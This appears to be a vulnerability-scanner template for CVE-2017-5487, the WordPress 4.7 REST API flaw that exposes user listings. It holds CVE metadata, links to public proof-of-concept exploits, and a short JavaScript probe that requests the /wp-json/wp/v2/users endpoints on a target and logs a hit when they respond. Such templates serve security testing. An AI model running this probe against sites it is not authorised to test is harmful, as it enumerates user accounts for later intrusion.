information:
  name: Wordpress 4.7 - Information exposure
  id: CVE-2017-5487
  description: wp-includes/rest-api/endpoints/class-wp-rest-users-controller. php in the REST API implementation in WordPress 4.7 before 4.7. 1 does not properly restrict listings of post authors, which allows remote attackers to obtain sensitive information via a wp-json/wp/v2/users request.
  risk: medium
  authors: Manas_Harsh, daffainfo, geeknik
  tags: cve, cve2017, wordpress, cves
  references:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5487#:~:text=wp%2Dincludes%2Frest%2Dapi,wp%2Fv2%2Fusers%20request.
  pocs:
    - https://github.com/patilkr/wp-CVE-2017-5487-exploit
    - https://github.com/GeunSam2/CVE-2017-5487
    - https://www.exploit-db.com/exploits/41497

code: |
  let parameters = ["/wp-json/wp/v2/users/", "/?rest_route=/wp/v2/users/"]

  async function request(i){
    try{
      let response = await _MakeQuest_(`{{url}}${parameters[i]}`)

      if(response.status == 200){
        Logger.attack_log({{self_info}}, `{{url}}${parameters[i]}`)
      }
    }catch{}

    if(i == parameters.length-1){
      resolve()
    }
  }

  for( i = 0; i < parameters.length; i++ ){
    request(i)
  }